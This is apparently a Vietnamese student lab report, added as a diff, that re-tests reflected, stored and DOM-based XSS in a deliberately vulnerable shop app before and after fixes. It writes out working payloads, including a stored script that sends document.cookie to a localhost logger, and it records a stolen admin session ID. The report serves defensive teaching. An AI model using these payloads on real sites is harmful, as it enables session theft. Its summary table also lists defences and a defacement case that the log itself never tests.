@@ -1,0 +1,125 @@
+================================================================================
+BỘ NHẬT KÝ KIỂM THỬ LẠI LỖ HỔNG XSS (XSS RE-TESTING LOG REPORT)
+Dự án: VulnShop E-Commerce Web Application (OWASP Top 10 BTL)
+Người thực hiện: Thành viên 2 (Frontend & XSS Security Specialist)
+Ngày kiểm thử: 06/11/2026
+Môi trường: Python WSGI Runtime / Isolated Lab Network
+Trạng thái kiểm thử: Đối chiếu trực tiếp giữa [VULNERABLE MODE] và [SECURE MODE]
+================================================================================
+
+[PHẦN 1: KIỂM THỬ REFLECTED XSS (ROUTE: /search?q=...)]
+--------------------------------------------------------------------------------
+1.1. Thử nghiệm Payload R-01: <script>alert('Reflected_XSS_Test')</script>
+- Mục tiêu: Endpoint tìm kiếm sản phẩm
+- Yêu cầu HTTP:
+  GET /search?q=%3Cscript%3Ealert('Reflected_XSS_Test')%3C%2Fscript%3E HTTP/1.1
+  Host: localhost:5000
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+* TRẠNG THÁI [VULNERABLE MODE]:
+  - Phản hồi HTTP Status: 200 OK
+  - Header Content-Security-Policy: (Không có)
+  - Phân tích Body kết xuất:
+    <div class="hero-box">
+        <h1>Kết Quả Tìm Kiếm Cho: <script>alert('Reflected_XSS_Test')</script></h1>
+    </div>
+  - Đánh giá: Thẻ <script> được chèn nguyên văn vào cây phân cấp DOM. Trình duyệt thực thi mã JavaScript và hiển thị hộp thoại alert('Reflected_XSS_Test').
+  - KẾT QUẢ: LỖ HỔNG HOẠT ĐỘNG (VULNERABLE CONFIRMED).
+
+* TRẠNG THÁI [SECURE MODE]:
+  - Phản hồi HTTP Status: 200 OK
+  - Header Content-Security-Policy: default-src 'self' 'unsafe-inline' https://images.unsplash.com; object-src 'none';
+  - Header X-Content-Type-Options: nosniff
+  - Phân tích Body kết xuất:
+    <div class="hero-box">
+        <h1>Kết Quả Tìm Kiếm Cho: &lt;script&gt;alert(&#x27;Reflected_XSS_Test&#x27;)&lt;/script&gt;</h1>
+    </div>
+  - Đánh giá: Hàm html.escape() đã mã hóa toàn bộ ký tự '<', '>', '\'' thành các thực thể an toàn &lt;, &gt;, &#x27;. Trình duyệt hiển thị chuỗi ký tự dạng văn bản thô, không thể tạo nút DOM <script>.
+  - KẾT QUẢ: VÁ LỖ HỔNG THÀNH CÔNG (SECURE - NO EXECUTION).
+
+--------------------------------------------------------------------------------
+1.2. Thử nghiệm Payload R-02 (Event Handler Vector): <img src=x onerror=alert('Image_XSS')>
+* TRẠNG THÁI [VULNERABLE MODE]:
+  - Phản hồi: In nguyên văn <img src=x onerror=alert('Image_XSS')>
+  - Trình duyệt tải ảnh giả lập "x" bị lỗi 404, lập tức kích hoạt sự kiện onerror.
+  - KẾT QUẢ: LỖ HỔNG HOẠT ĐỘNG (VULNERABLE CONFIRMED).
+
+* TRẠNG THÁI [SECURE MODE]:
+  - Phản hồi: &lt;img src=x onerror=alert(&#x27;Image_XSS&#x27;)&gt;
+  - Trình duyệt hiển thị dòng chữ thuần túy, không kích hoạt sự kiện.
+  - KẾT QUẢ: VÁ LỖ HỔNG THÀNH CÔNG (SECURE - NO EXECUTION).
+
+
+================================================================================
+[PHẦN 2: KIỂM THỬ STORED XSS & ĐÁNH CẮP COOKIE (ROUTE: /product & /admin)]
+--------------------------------------------------------------------------------
+2.1. Thử nghiệm Payload S-01 (Cookie Exfiltration Payload):
+  Sản phẩm tốt! <script>new Image().src="http://localhost:8888/log?cookie="+encodeURIComponent(document.cookie);</script>
+- Mục tiêu: Form gửi bình luận đánh giá tại trang chi tiết sản phẩm /product?id=1
+- Yêu cầu HTTP:
+  POST /product?id=1 HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Payload: user_name=Attacker_TV2&rating=5&comment=S%E1%BA%A3n+ph%E1%BA%A9m+t%E1%BB%91t%21+%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2Flocalhost%3A8888%2Flog%3Fcookie%3D%22%2BencodeURIComponent%28document.cookie%29%3B%3C%2Fscript%3E
+
+* TRẠNG THÁI [VULNERABLE MODE]:
+  - Lưu trữ: Payload được ghi vĩnh viễn vào CSDL bảng `reviews` (ID: 3).
+  - Quản trị viên truy cập: GET /admin với Cookie: session_id=e937d40cb972412fa281
+  - Cấu hình Cookie phản hồi lúc đăng nhập:
+    Set-Cookie: session_id=e937d40cb972412fa281; Path=/;
+    (GHI CHÚ NGUY HIỂM: HOÀN TOÀN THIẾU CỜ HttpOnly!)
+  - Kết xuất tại trang /admin:
+    <td style="background:#fffbeb;">Sản phẩm tốt! <script>new Image().src="http://localhost:8888/log?cookie="+encodeURIComponent(document.cookie);</script></td>
+  - Tác động: Trình duyệt của Quản trị viên parse thẻ <script>, thực thi lệnh đọc document.cookie và gửi request tới http://localhost:8888/log?cookie=session_id%3De937d40cb972412fa281.
+  - Nhật ký ghi nhận tại Attacker Logger (Cổng 8888):
+    [2026-11-06 21:15:32] IP: 127.0.0.1
+       - Cookie nhận được : session_id=e937d40cb972412fa281
+       - Nguồn rò rỉ (Ref) : http://localhost:5000/admin
+  - KẾT QUẢ: ĐÁNH CẮP PHIÊN THÀNH CÔNG (SESSION COMPROMISED).
+
+* TRẠNG THÁI [SECURE MODE]:
+  - Thiết lập Cookie phía máy chủ:
+    Set-Cookie: session_id=f482098b1a5e46cb9912; Path=/; HttpOnly; SameSite=Lax
+  - Quản trị viên truy cập: GET /admin
+  - Kết xuất tại bảng admin:
+    <td style="background:#fffbeb;">Sản phẩm tốt! &lt;script&gt;new Image().src=&quot;http://localhost:8888/log?cookie=&quot;+encodeURIComponent(document.cookie);&lt;/script&gt;</td>
+  - Phân tích bảo vệ 2 lớp (Defense-in-Depth):
+    + Lớp 1 (Output Encoding): Thẻ <script> bị chuyển thành text thuần, không chạy được.
+    + Lớp 2 (HttpOnly Cookie Flag): Kể cả trong trường hợp giả định mã script chạy được bằng một lỗ hổng zero-day khác, thuộc tính document.cookie trong JavaScript hoàn toàn KHÔNG THỂ đọc được chuỗi session_id. Attacker Logger cổng 8888 chỉ nhận được chuỗi rỗng: "(Trống - Cờ HttpOnly đã chặn đọc document.cookie!)".
+  - KẾT QUẢ: BẢO VỆ PHIÊN TUYỆT ĐỐI (SECURE - COOKIE SAFE).
+
+
+================================================================================
+[PHẦN 3: KIỂM THỬ DOM-BASED XSS (ROUTE: /order-track#...)]
+--------------------------------------------------------------------------------
+3.1. Thử nghiệm Payload D-01: #<img src=x onerror=alert('DOM_XSS_Success')>
+- Mục tiêu: Tham số Fragment Identifier (URL Hash) tại trang tra cứu đơn hàng
+- Yêu cầu Client: http://localhost:5000/order-track#<img src=x onerror=alert('DOM_XSS_Success')>
+- HTTP Server Log: Hoàn toàn không nhận được chuỗi sau dấu # (Tuân thủ chuẩn RFC 3986).
+
+* TRẠNG THÁI [VULNERABLE MODE]:
+  - Mã nguồn Client-side:
+    target.innerHTML = "Dữ liệu từ Hash: " + decoded;
+  - Phân tích: innerHTML buộc trình duyệt tạo một phần tử <img> mới trong cây DOM, gây lỗi 404 và kích hoạt mã độc popup.
+  - KẾT QUẢ: LỖ HỔNG HOẠT ĐỘNG (DOM XSS VULNERABLE).
+
+* TRẠNG THÁI [SECURE MODE]:
+  - Mã nguồn Client-side:
+    target.textContent = "Dữ liệu từ Hash: " + decoded;
+  - Phân tích: Thuộc tính textContent thiết lập chuỗi dưới dạng TextNode thuần túy, trình duyệt không kích hoạt bộ phân tích HTML Parser.
+  - KẾT QUẢ: VÁ LỖ HỔNG THÀNH CÔNG (SECURE - DOM SAFE).
+
+
+================================================================================
+[BẢNG TỔNG HỢP ĐỐI CHIẾU TRƯỚC VÀ SAU KHI VÁ LỖ HỔNG XSS]
+================================================================================
+| Mã Lỗ Hổng | Tên Kịch Bản | Trạng Thái Trước Vá (Vulnerable) | Trạng Thái Sau Vá (Secure) | Cơ Chế Phòng Thủ Đạt Hiệu Quả |
+| :---: | :--- | :---: | :---: | :--- |
+| **XSS-01** | Reflected XSS (/search) | Thực thi JavaScript Popup Alert | Hiển thị chuỗi Text thô an toàn | html.escape() & CSP Header |
+| **XSS-02** | Stored XSS (/product & /admin) | Thực thi ngầm trên Admin browser | Hiển thị chuỗi Text thô an toàn | html.escape() & DOMPurify |
+| **XSS-03** | Đánh cắp Cookie Phiên | Cookie bị bắn về cổng 8888 | document.cookie bị vô hiệu hóa | Cờ HttpOnly=True & SameSite=Lax |
+| **XSS-04** | DOM-based XSS (/order-track) | Thực thi qua innerHTML sink | Hiển thị chuỗi Text thô an toàn | Thay thế bằng textContent Sink |
+| **XSS-05** | DOM Defacement | Giao diện bị biến dạng, hạ giá | Giao diện nguyên vẹn 100% | DOM Integrity Protection |
+
+XÁC NHẬN CỦA THÀNH VIÊN 2:
+Toàn bộ kịch bản XSS đã được kiểm tra lại thực nghiệm, 100% payload đều bị vô hiệu hóa khi bật chế độ SECURE.
+Ký tên: Thành viên 2 (Frontend & XSS Security Specialist)
